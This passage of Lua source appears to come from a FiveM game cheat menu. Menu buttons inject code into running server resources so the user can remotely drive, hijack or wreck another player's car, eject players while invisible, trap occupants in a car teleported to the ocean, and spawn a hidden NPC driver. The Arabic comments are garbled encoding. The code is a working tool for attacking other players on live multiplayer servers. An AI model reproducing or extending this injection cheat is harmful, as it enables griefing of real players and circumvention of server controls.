                                                    local currentCoords = GetEntityCoords(RemoteCar.Entity)
                                                    local newCoords = vector3(
                                                        currentCoords.x + (moveX * 0.02),
                                                        currentCoords.y + (moveY * 0.02),
                                                        currentCoords.z + (moveZ * 0.02)
                                                    )
                                                    SetEntityCoordsNoOffset(RemoteCar.Entity, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                                else
                                                    local boost = IsControlPressed(0, 21)
                                                    local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                    local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                    local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                    local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                    local brake = IsControlPressed(0, 22)
                                                    local actionTaken = false
                                                    if boost and RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                        SetVehicleForwardSpeed(RemoteCar.Entity, GetEntitySpeed(RemoteCar.Entity) + 2.0)
                                                    end
                                                    if forward and left then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 7, 1)
                                                        actionTaken = true
                                                    elseif forward and right then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 8, 1)
                                                        actionTaken = true
                                                    elseif backward and left then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 13, 1)
                                                        actionTaken = true
                                                    elseif backward and right then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 14, 1)
                                                        actionTaken = true
                                                    elseif forward then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 9, 1)
                                                        actionTaken = true
                                                    elseif backward then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 22, 1)
                                                        actionTaken = true
                                                    elseif left then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 4, 1)
                                                        actionTaken = true
                                                    elseif right then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 5, 1)
                                                        actionTaken = true
                                                    elseif brake then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 1000)
                                                        actionTaken = true
                                                    end
                                                    if not actionTaken then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                    end
                                                end
                                            end)
                                        end
                                    end

                                    RemoteCar.Stop = function()
                                        pcall(function()
                                            RemoteCar.StopSpectate()
                                            RemoteCar.RestoreOriginalAudio()
                                            if isFlying then
                                                isFlying = false
                                                SetVehicleGravity(RemoteCar.Entity, true)
                                                SetEntityCollision(RemoteCar.Entity, true, true)
                                                SetEntityCollision(RemoteCar.BotPed, true, true)
                                                local coords = GetEntityCoords(RemoteCar.Entity)
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                                PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                SetEntityDynamic(RemoteCar.Entity, true)
                                                SetEntityDynamic(RemoteCar.BotPed, true)
                                            end
                                            if isHonking then
                                                isHonking = false
                                                if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    for i = 0, 3 do
                                                        SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                    end
                                                    SetVehicleLights(RemoteCar.Entity, originalLightState)
                                                end
                                            end
                                            ClearFocus()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                                ClearFocus()
                                            end
                                            if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                                DeleteEntity(RemoteCar.BotPed)
                                            end
                                            RemoteCar.Entity = nil
                                            RemoteCar.BotPed = nil
                                            RemoteCar.OriginalPed = nil
                                            audioEnabled = false
                                        end)
                                    end

                                    RemoteCar.Start()
                                end

                                SetEntityVisible(playerPed, true, false)
                            end
                        end)
                    ]])
                        MachoMenuNotification("Remote Car", "Started remote control for Player ID: " .. GetPlayerServerId(selectedPlayer) .. "'s vehicle")
                    else
                        MachoMenuNotification("Remote Car", "No resources found!")
                    end
                else
                    MachoMenuNotification("Error", "Selected player is not in a vehicle")
                end
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    
    -- CallbackDisabled: This code runs when the checkbox is unselected (disabling remote control)
    function()
        -- Destroy the DUI directly from here
        if menuDUI then
            MachoDestroyDui(menuDUI)
            menuDUI = nil
            menuVisible = false
            MachoMenuNotification("Remote Car", "Remote control session ended and menu closed.")
        end
    end
)
MachoMenuButton(PlayerSection, "hijack Player Vehicle", function()
   local selectedPlayer = MachoMenuGetSelectedPlayer()  
   if selectedPlayer and selectedPlayer ~= -1 then      
       local targetPed = GetPlayerPed(selectedPlayer)   
       if targetPed and DoesEntityExist(targetPed) then
           ClearPedTasksImmediately(PlayerPedId())
           local targetVehicle = GetVehiclePedIsIn(targetPed, false)
           if targetVehicle ~= 0 then
               MachoInjectResource("any", [[
                   Citizen.CreateThread(function()
                       local playerPed = PlayerPedId()
                       local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                       local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                       
                       if targetVehicle ~= 0 then
                           SetPedMoveRateOverride(playerPed, 10.0)
                           ClearPedTasks(playerPed)
                           SetVehicleForwardSpeed(targetVehicle, 0.0)
                           SetVehicleDoorsLocked(targetVehicle, 1)
                           SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                           
                           TaskLeaveVehicle(targetPed, targetVehicle, 0)
                           
                           SetPedMoveRateOverride(playerPed, 3.0)
                           
                           ClearPedTasks(playerPed)
                           SetVehicleForwardSpeed(targetVehicle, 0.0)
                           
                           SetPedIntoVehicle(playerPed, targetVehicle, -1)
                           TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                           
                           SetPedMoveRateOverride(playerPed, 1.0)
                       end
                   end)
               ]])
               MachoMenuNotification("Vehicle", "Hijacking vehicle from Player ID: " .. GetPlayerServerId(selectedPlayer))
           else
               MachoMenuNotification("Error", "Selected player is not in a vehicle")
           end
       else
           MachoMenuNotification("Error", "Player not found")
       end
   else
       MachoMenuNotification("Error", "No player selected")
   end
end)
MachoMenuButton(PlayerSection, "Kick from Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)   
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "Destroy Vehicle Body", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                -- ÙÙƒ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¹Ø¬Ù„Ø§Øª
                                for i = 0, 3 do
                                    BreakOffVehicleWheel(targetVehicle, i, true, false, true, false)
                                end
                                
                                -- ÙÙƒ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¨ÙˆØ§Ø¨
                                for i = 0, 3 do
                                    SetVehicleDoorBroken(targetVehicle, i, true)
                                end
                                
                                -- ÙÙƒ Ø§Ù„Ø´Ù†Ø·Ø© Ø§Ù„Ø®Ù„ÙÙŠØ©
                                SetVehicleDoorBroken(targetVehicle, 5, true)
                                
                                -- ÙÙƒ Ø§Ù„ÙƒØ¨ÙˆØª
                                SetVehicleDoorBroken(targetVehicle, 4, true)
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "Destroy Vehicle Engine ", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                -- ØªØ®Ø±ÙŠØ¨ Ø§Ù„Ù…Ø­Ø±Ùƒ ÙÙ‚Ø·
                                SetVehicleEngineHealth(targetVehicle, 0.0)
                                SetVehicleEngineOn(targetVehicle, false, true, true)
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Engine damaged for Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)


MachoMenuButton(PlayerSection, "TP Vehicle To Ocean", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            SetEntityVisible(playerPed, true, false)
                            
                            Citizen.Wait(200)
                            
                            if DoesEntityExist(targetVehicle) then
                                NetworkRequestControlOfEntity(targetVehicle)
                                SetEntityAsMissionEntity(targetVehicle, true, true)
                                
                                Citizen.Wait(100)
                                
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                for seat = 0, maxSeats do
                                    local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                    if ped ~= 0 and ped ~= playerPed then
                                        SetPedCanBeDraggedOut(ped, false)
                                        SetPedConfigFlag(ped, 32, true)
                                        TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                    end
                                end
                                
                                Citizen.Wait(100)
                                
                                SetEntityCoordsNoOffset(targetVehicle, -14382.92, 3330.65, -115.97, false, false, false)
                                SetEntityHeading(targetVehicle, 0.0)
                                SetVehicleOnGroundProperly(targetVehicle)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "NPC Hijack Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            SetEntityVisible(playerPed, true, false)
                            
                            Citizen.Wait(200)
                            
                            if DoesEntityExist(targetVehicle) then
                                NetworkRequestControlOfEntity(targetVehicle)
                                SetEntityAsMissionEntity(targetVehicle, true, true)
                                
                                Citizen.Wait(100)
                                
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                for seat = 0, maxSeats do
                                    local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                    if ped ~= 0 and ped ~= playerPed then
                                        SetPedCanBeDraggedOut(ped, false)
                                        SetPedConfigFlag(ped, 32, true)
                                        TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                    end
                                end
                                
                                -- Ø¥Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª Ù„Ù„Ù‚ÙŠØ§Ø¯Ø© (client side only)
                                local botModel = GetHashKey("mp_m_freemode_01")
                                RequestModel(botModel)
                                while not HasModelLoaded(botModel) do
                                    Citizen.Wait(0)
                                end
                                
                                -- Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø¨ÙˆØª Ù…Ø¨Ø§Ø´Ø±Ø© Ø¯Ø§Ø®Ù„ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                
                                -- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª
                                SetEntityAsMissionEntity(botPed, false, false)
                                SetPedCanBeDraggedOut(botPed, false)
                                SetPedConfigFlag(botPed, 32, true)
                                SetPedFleeAttributes(botPed, 0, false)
                                SetPedCombatAttributes(botPed, 17, true)
                                SetPedSeeingRange(botPed, 0.0)
                                SetPedHearingRange(botPed, 0.0)
                                SetPedAlertness(botPed, 0)
                                SetPedKeepTask(botPed, true)
                                SetEntityCollision(botPed, false, false)
                                
                                -- Ø§Ù„Ø¨ÙˆØª ÙŠØ¸Ù‡Ø± Ù„ÙŠ ÙÙ‚Ø· (Ù…Ø®ÙÙŠ Ø¹Ù† Ø§Ù„Ø¢Ø®Ø±ÙŠÙ†)
                                SetEntityVisible(botPed, true, false) -- ÙŠØ¸Ù‡Ø± Ù„ÙŠ
                                NetworkSetEntityInvisibleToNetwork(botPed, true) -- Ù…Ø®ÙÙŠ Ø¹Ù† Ø§Ù„Ø´Ø¨ÙƒØ©/Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø§Ù„Ø¢Ø®Ø±ÙŠÙ†
                                
                                -- ÙˆØ¶Ø¹ Ø§Ù„Ø¨ÙˆØª ÙÙŠ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙƒØ³Ø§Ø¦Ù‚ ÙÙˆØ±Ø§Ù‹
                                SetPedIntoVehicle(botPed, targetVehicle, -1)
                                
                                Citizen.Wait(100)
                                
                                -- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø³ÙŠØ§Ø±Ø© 
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                SetVehicleEngineOn(targetVehicle, true, true, false)
                                
                                -- ØªØ­Ø³ÙŠÙ† Ø£Ø¯Ø§Ø¡ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ø¨Ø´ÙƒÙ„ Ù…Ø¹Ù‚ÙˆÙ„
                                SetVehicleEnginePowerMultiplier(targetVehicle, 1.5) -- Ø²ÙŠØ§Ø¯Ø© Ø¨Ø³ÙŠØ·Ø© ÙÙŠ Ù‚ÙˆØ© Ø§Ù„Ù…Ø­Ø±Ùƒ
                                ModifyVehicleTopSpeed(targetVehicle, 1.3) -- Ø²ÙŠØ§Ø¯Ø© Ø§Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ù‚ØµÙˆÙ‰ Ø¨Ù†Ø³Ø¨Ø© 30%
                                
                                -- Ø§Ù„Ø¨ÙˆØª ÙŠØªÙ…Ø´Ù‰ Ø¨Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                                Citizen.CreateThread(function()
                                    while DoesEntityExist(botPed) and DoesEntityExist(targetVehicle) do
                                        if IsPedInVehicle(botPed, targetVehicle, false) then
                                            -- Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ø§Ù„Ø­Ø§Ù„ÙŠ
                                            local vehiclePos = GetEntityCoords(targetVehicle)
                                            
                                            -- Ø¥Ù†Ø´Ø§Ø¡ Ù†Ù‚Ø·Ø© Ø¹Ø´ÙˆØ§Ø¦ÙŠØ© Ù‚Ø±ÙŠØ¨Ø© Ù„Ù„ØªÙ…Ø´ÙŠ Ø¥Ù„ÙŠÙ‡Ø§
                                            local randomX = vehiclePos.x + math.random(-700, 700)
